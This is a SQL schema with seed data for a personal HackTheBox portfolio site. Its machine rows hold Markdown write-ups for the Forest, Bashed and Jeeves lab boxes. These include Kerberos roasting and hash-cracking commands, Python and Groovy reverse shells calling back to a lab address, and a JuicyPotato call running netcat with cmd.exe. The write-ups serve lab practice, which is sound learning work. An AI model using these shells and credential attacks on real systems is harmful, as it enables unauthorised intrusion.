-- Cloudflare D1 Database Schema for 0xJerry's Lab

-- HTB Stats table
CREATE TABLE IF NOT EXISTS htb_stats (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    machines_pwned INTEGER NOT NULL DEFAULT 0,
    global_ranking INTEGER NOT NULL DEFAULT 0,
    final_score INTEGER NOT NULL DEFAULT 0,
    htb_rank TEXT NOT NULL DEFAULT 'Noob',
    last_updated DATETIME DEFAULT CURRENT_TIMESTAMP,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Insert initial data
INSERT OR REPLACE INTO htb_stats (id, machines_pwned, global_ranking, final_score, htb_rank, last_updated)
VALUES (1, 127, 15420, 890, 'Hacker', CURRENT_TIMESTAMP);

-- Cache table for news and CVE data (optional)
CREATE TABLE IF NOT EXISTS cache_data (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    cache_key TEXT UNIQUE NOT NULL,
    data TEXT NOT NULL, -- JSON data
    expires_at DATETIME NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Admin users table (for password authentication)
CREATE TABLE IF NOT EXISTS admin_users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password_hash TEXT NOT NULL,
    salt TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    last_login DATETIME,
    is_active BOOLEAN DEFAULT 1
);


-- Admin logs table (for tracking changes)
CREATE TABLE IF NOT EXISTS admin_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    action TEXT NOT NULL,
    data TEXT, -- JSON data of changes
    ip_address TEXT,
    user_agent TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- HTB Machines table
CREATE TABLE IF NOT EXISTS htb_machines (
    id TEXT PRIMARY KEY,
    name TEXT NOT NULL,
    os TEXT NOT NULL,
    difficulty TEXT NOT NULL CHECK (difficulty IN ('Easy', 'Medium', 'Hard', 'Insane')),
    status TEXT NOT NULL CHECK (status IN ('Completed', 'In Progress', 'Not Started', 'Retired')),
    date_completed DATE,
    tags TEXT, -- JSON array of tags
    writeup TEXT, -- Markdown writeup content
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Insert sample HTB machine data
INSERT OR REPLACE INTO htb_machines (id, name, os, difficulty, status, date_completed, tags, writeup)
VALUES 
    ('forest', 'Forest', 'Windows', 'Easy', 'Completed', '2024-12-15', 
     '["Active Directory", "Kerberoasting", "DCSync"]',
     '# Forest - HTB Writeup

## Machine Information
- **OS**: Windows
- **Difficulty**: Easy
- **Date Completed**: December 15, 2024

## Enumeration

### Nmap Scan
```bash
nmap -sC -sV -oA forest 10.10.10.161
```

### Results
- Port 88: Kerberos
- Port 389: LDAP
- Port 445: SMB

## Exploitation

### ASREPRoasting
Found users without Kerberos pre-authentication:
```bash
GetNPUsers.py htb.local/ -no-pass -usersfile users.txt
```

### Cracking Hash
```bash
hashcat -m 18200 hash.txt rockyou.txt
```

## Privilege Escalation

### DCSync Attack
Used BloodHound to identify path to Domain Admin:
```bash
bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 -c all
```

## Root
Successfully obtained Domain Admin privileges and retrieved both flags.

**User Flag**: `32a-...-de4`
**Root Flag**: `f04-...-a4e`'),
    ('bashed', 'Bashed', 'Linux', 'Easy', 'Completed', '2024-12-10',
     '["Web Shell", "Privilege Escalation", "Sudo"]',
     '# Bashed - HTB Writeup

## Machine Information
- **OS**: Linux
- **Difficulty**: Easy
- **Date Completed**: December 10, 2024

## Enumeration

### Web Enumeration
Found phpbash.php web shell in /dev/ directory.

## Exploitation

### Initial Access
Used the web shell to get initial foothold:
```bash
whoami
# www-data
```

### Reverse Shell
```bash
python -c ''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.x",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);''
```

## Privilege Escalation

### Sudo Permissions
```bash
sudo -l
# User scriptmanager may run the following commands on bashed:
#    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

### Root via Scripts
Found scripts directory with root execution:
```bash
echo ''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.x",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'' > test.py
```

## Root
Obtained root access through scheduled script execution.

**User Flag**: `2c2-...-bb7`
**Root Flag**: `cc4-...-a4e`'),
    ('jeeves', 'Jeeves', 'Windows', 'Medium', 'Completed', '2024-12-05',
     '["Jenkins", "RCE", "Alternate Data Streams"]',
     '# Jeeves - HTB Writeup

## Machine Information
- **OS**: Windows
- **Difficulty**: Medium
- **Date Completed**: December 5, 2024

## Enumeration

### Port Scan
```bash
nmap -sC -sV -oA jeeves 10.10.10.63
```

### Jenkins Discovery
Found Jenkins on port 50000 without authentication.

## Exploitation

### Jenkins Script Console
Used Groovy script console for RCE:
```groovy
String host="10.10.14.x";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Privilege Escalation

### Token Impersonation
Used JuicyPotato for privilege escalation:
```cmd
JuicyPotato.exe -l 9999 -p nc.exe -a "-e cmd.exe 10.10.14.x 5555" -t *
```

## Root

### Alternate Data Streams
Root flag hidden in ADS:
```cmd
dir /R
# Found hm.txt:root.txt:$DATA
more < hm.txt:root.txt
```

**User Flag**: `af6-...-0e8`
**Root Flag**: `18a-...-d20`'),
    ('academy', 'Academy', 'Linux', 'Easy', 'In Progress', NULL,
     '["Web", "MySQL", "Laravel"]',
     NULL);

-- Indexes for better performance
CREATE INDEX IF NOT EXISTS idx_cache_key ON cache_data(cache_key);
CREATE INDEX IF NOT EXISTS idx_cache_expires ON cache_data(expires_at);
CREATE INDEX IF NOT EXISTS idx_admin_logs_timestamp ON admin_logs(timestamp);
CREATE INDEX IF NOT EXISTS idx_htb_machines_status ON htb_machines(status);
CREATE INDEX IF NOT EXISTS idx_htb_machines_difficulty ON htb_machines(difficulty);
CREATE INDEX IF NOT EXISTS idx_htb_machines_os ON htb_machines(os);
CREATE INDEX IF NOT EXISTS idx_htb_machines_date_completed ON htb_machines(date_completed);
